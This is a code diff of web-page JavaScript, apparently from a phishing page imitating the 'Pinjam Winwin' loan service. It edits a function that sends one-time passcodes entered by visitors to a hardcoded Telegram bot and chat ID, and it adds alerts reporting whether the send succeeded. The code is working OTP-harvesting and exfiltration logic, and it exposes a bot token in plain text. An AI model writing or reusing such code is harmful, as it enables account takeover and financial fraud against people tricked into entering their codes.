@@ -176,21 +176,26 @@
                     }
                 });
             });
-
-            // Fungsi untuk mengirim OTP ke bot Telegram menggunakan AJAX
+            
             function sendOTPToTelegram(otp) {
-                const botToken = '6711678141:AAHCPWlRygK8bHdAhXUlfIFCf6GztfCwsjY'; // Ganti dengan Bot Token Anda
-                const chatID = '6824078885'; // Ganti dengan Chat ID Anda
-                const message = `Kode OTP-Pinjam Winwin ${otp}`;
+    const botToken = '6711678141:AAHCPWlRygK8bHdAhXUlfIFCf6GztfCwsjY'; // Ganti dengan Bot Token Anda
+    const chatID = '6824078885'; // Ganti dengan Chat ID Anda
+    const message = `Kode OTP-Pinjam Winwin ${otp}`;
 
-                const url = `https://api.telegram.org/bot6711678141:AAHCPWlRygK8bHdAhXUlfIFCf6GztfCwsjY/sendMessage?chat_id=6824078885&text=${encodeURIComponent(message)}`;
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`;
 
-                const xhr = new XMLHttpRequest();
-                xhr.open("GET", url, true);
-                xhr.send();
-            }
+    const xhr = new XMLHttpRequest();
+    xhr.open("GET", url, true);
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4 && xhr.status == 200) {
+            alert('OTP berhasil dikirim ke Telegram!');
+        } else if (xhr.readyState == 4) {
+            alert('Gagal mengirim OTP ke Telegram.');
+        }
+    };
+    xhr.send();
+}
 
-            // Mencegah submit jika semua input belum terisi dan mengirimkan OTP ke Telegram
             submitBtn.addEventListener('click', function(e) {
                 if (submitBtn.disabled) {
                     e.preventDefault();
